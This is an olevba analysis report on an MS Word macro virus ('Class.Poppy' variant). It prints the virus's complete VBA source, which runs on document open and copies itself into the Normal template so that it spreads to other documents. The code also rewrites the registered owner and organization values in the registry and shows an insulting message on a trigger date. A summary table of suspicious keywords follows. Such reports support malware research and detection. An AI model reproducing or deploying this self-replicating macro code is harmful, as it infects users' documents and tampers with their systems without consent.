olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-f1e29adabdd18b40c227540ae25966e7ea187d81
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-f1e29adabdd18b40c227540ae25966e7ea187d81 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Harry H.9/1/01 2:52:10 AMDok1.doc
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Harry H.9/1/01 2:52:10 AMDok1.doc
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Harry H.9/1/01 2:52:10 AMDok1.doc
Const REG_SZ As Long = 1
'Harry H.9/1/01 2:52:10 AMDok1.doc
Const HKEY_CURRENT_USER As Long = &H80000001
'Harry H.9/1/01 2:52:10 AMDok1.doc
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Harry H.9/1/01 2:52:10 AMDok1.doc
Sub AutoOpen()
'Harry H.9/1/01 2:52:10 AMDok1.doc
On Error GoTo out
'Harry H.9/1/01 2:52:10 AMDok1.doc
Options.VirusProtection = True
'Harry H.9/1/01 2:52:10 AMDok1.doc
Options.SaveNormalPrompt = True
'Harry H.9/1/01 2:52:10 AMDok1.doc
Options.ConfirmConversions = True
'Harry H.9/1/01 2:52:10 AMDok1.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Harry H.9/1/01 2:52:10 AMDok1.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Harry H.9/1/01 2:52:10 AMDok1.doc
If nt > 70 And ad > 0 Then GoTo out
'Harry H.9/1/01 2:52:10 AMDok1.doc
If nt < 70 Then
'Harry H.9/1/01 2:52:10 AMDok1.doc
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Harry H.9/1/01 2:52:10 AMDok1.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Harry H.9/1/01 2:52:10 AMDok1.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Harry H.9/1/01 2:52:10 AMDok1.doc
End If
'Harry H.9/1/01 2:52:10 AMDok1.doc
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Harry H.9/1/01 2:52:10 AMDok1.doc
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Harry H.9/1/01 2:52:10 AMDok1.doc
host.codemodule.AddFromFile ("c:\class.sys")
'Harry H.9/1/01 2:52:10 AMDok1.doc
With host.codemodule
'Harry H.9/1/01 2:52:10 AMDok1.doc
    For x = 1 To 16
'Harry H.9/1/01 2:52:10 AMDok1.doc
    .deletelines 1
'Harry H.9/1/01 2:52:10 AMDok1.doc
    Next x
'Harry H.9/1/01 2:52:10 AMDok1.doc
End With
'Harry H.9/1/01 2:52:10 AMDok1.doc
If nt < 70 Then
'Harry H.9/1/01 2:52:10 AMDok1.doc
    With host.codemodule
'Harry H.9/1/01 2:52:10 AMDok1.doc
    .replaceline 1, "Sub AutoClose()"
'Harry H.9/1/01 2:52:10 AMDok1.doc
    .replaceline 91, "Sub ToolsMacro()"
'Harry H.9/1/01 2:52:10 AMDok1.doc
    For x = 70 To 81
'Harry H.9/1/01 2:52:10 AMDok1.doc
        .deletelines 62
'Harry H.9/1/01 2:52:10 AMDok1.doc
    Next x
'Harry H.9/1/01 2:52:10 AMDok1.doc
    .replaceline 35, "    For x = 1 To 4"
'Harry H.9/1/01 2:52:10 AMDok1.doc
    End With
'Harry H.9/1/01 2:52:10 AMDok1.doc
End If
'Harry H.9/1/01 2:52:10 AMDok1.doc
If nt < 70 Then
'Harry H.9/1/01 2:52:10 AMDok1.doc
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Harry H.9/1/01 2:52:10 AMDok1.doc
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Harry H.9/1/01 2:52:10 AMDok1.doc
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Harry H.9/1/01 2:52:10 AMDok1.doc
u = RegCloseKey(k)
'Harry H.9/1/01 2:52:10 AMDok1.doc
End If
'Harry H.9/1/01 2:52:10 AMDok1.doc
With host.codemodule
'Harry H.9/1/01 2:52:10 AMDok1.doc
    For x = 2 To 104 Step 2
'Harry H.9/1/01 2:52:10 AMDok1.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Harry H.9/1/01 2:52:10 AMDok1.doc
    Next x
'Harry H.9/1/01 2:52:10 AMDok1.doc
End With
'Harry H.9/1/01 2:52:10 AMDok1.doc
out:
'Harry H.9/1/01 2:52:10 AMDok1.doc
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Harry H.9/1/01 2:52:10 AMDok1.doc
End Sub
'Harry H.9/1/01 2:52:10 AMDok1.doc
Sub ViewVBCode()
'Harry H.9/1/01 2:52:10 AMDok1.doc
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

